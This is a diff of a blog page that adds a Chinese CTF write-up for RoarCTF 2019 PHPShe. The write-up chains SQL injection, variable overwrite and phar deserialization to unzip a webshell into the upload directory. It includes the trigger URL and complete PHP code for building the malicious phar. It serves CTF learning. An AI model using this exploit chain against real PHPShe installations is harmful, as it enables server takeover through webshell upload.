@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>CTF | 过客</title>
+  <title>[RoarCTF 2019]PHPShe(注入+phar反序列化) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="CTF | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[RoarCTF 2019]PHPShe(注入+phar反序列化) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[RoarCTF 2019]PHPShe(注入+phar反序列化)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/zE_m1kHQm/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -66,94 +71,115 @@
       </div>
     </div>
   </nav>
-<!-- Page Header -->
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">#CTF</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[RoarCTF 2019]PHPShe(注入+phar反序列化)</h1>
+            <span class="meta">
+            	Posted on
+              2020-06-20，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
+  <!-- Post Content -->
+  <article>
     <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/oUQYTq6U9/">
-            <h2 class="post-title">
-              CTF PHP代码审计中file_put_contents函数利用
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p>源码分析</p>
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>首先就是PHPShecms的sql注入。<br>
+在基础上。用无列名注入注出密码<br>
+<img src="https://guokeya.github.io/post-images/1592640584343.png" alt="" loading="lazy"><br>
+然后登陆后台。。看WP。说是在源码中的类文件进行了修改<br>
+<img src="https://guokeya.github.io/post-images/1592640766242.png" alt="" loading="lazy"><br>
+跟踪下extrac函数的第一个参数。发现这是个PCLZIP解压缩。savepath。应该是压缩文件解压缩的路径<br>
+<img src="https://guokeya.github.io/post-images/1592640852344.png" alt="" loading="lazy"><br>
+这里我们可以将一句话木马压缩为zip上传。然后通过触发这个解压缩。到指定上传目录。<br>
+继续看触发点<br>
+在admin.php。首先包含了一个common.php。存在变量覆盖<br>
+<img src="https://guokeya.github.io/post-images/1592641765125.png" alt="" loading="lazy"><br>
+然后对变量加上前缀。进行处理<br>
+<img src="https://guokeya.github.io/post-images/1592641519443.png" alt="" loading="lazy"><br>
+第三个选项。在前缀和键值中会加一个下划线<br>
+继续看。可以包含任意目录的php文件<br>
+<img src="https://guokeya.github.io/post-images/1592641319282.png" alt="" loading="lazy"><br>
+利用变量覆盖。包含admin目录下的moban.php<br>
+只有它引用了pclzip.class.php<br>
+<img src="https://guokeya.github.io/post-images/1592641928571.png" alt="" loading="lazy"><br>
+swith。一个act参数。<br>
+进入del。<br>
+<img src="https://guokeya.github.io/post-images/1592642022392.png" alt="" loading="lazy"><br>
+pe_dbhold函数。主要就是addslashes。htmlspecialchars。转义什么的。<br>
+进入pe_dirdel函数。带入参数tpl。if_exists。触发phar反序列化。<br>
+<img src="https://guokeya.github.io/post-images/1592642140721.png" alt="" loading="lazy"><br>
+ok。构造phar。上传phar和zip。然后反序列化触发destrcut解压一句话到上传目录<br>
+这里。我们还漏了一个东西。就是del后的第一个函数<br>
+<img src="https://guokeya.github.io/post-images/1592642241712.png" alt="" loading="lazy"><br>
+需要提交token和referer。找下token在哪生成<br>
+<img src="https://guokeya.github.io/post-images/1592643537788.png" alt="" loading="lazy"><br>
+最后。触发phar反序列化<br>
+<code>http://1ccb4b36-6561-4c5b-8e5b-10103cd8f8e8.node3.buuoj.cn/admin.php?mod=moban&amp;act=del&amp;token=e7e44f204371fcf3072dcd5c4097764e&amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt</code><br>
+pharexp</p>
+<pre><code>&lt;?php
+class PclZip
+{
+    var $zipname = '';
+    var $zip_fd = 0;
+    var $error_code = 1;
+    var $error_string = '';
+    var $magic_quotes_status;
+    var $save_path;
+    function __construct($p_zipname)
+    {
+        $this-&gt;zipname = $p_zipname;
+        $this-&gt;zip_fd = 0;
+        $this-&gt;magic_quotes_status = -1;
+        return;
+    }
+}
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
+$f=new PclZip(&quot;/var/www/html/data/attachment/brand/1.zip&quot;);
+$f-&gt;save_path='/var/www/html/data';
+echo serialize($f);
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;,&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($f);
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1592643642788.png" alt="" loading="lazy"></figure>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/mT80JFOVo/">
+              <span class="post-title">
+                Connect-The-Dots 靶机渗透&rarr;
+              </span>
             </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/tag/CTF/page/9/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
+  </article>
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -234,3 +260,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
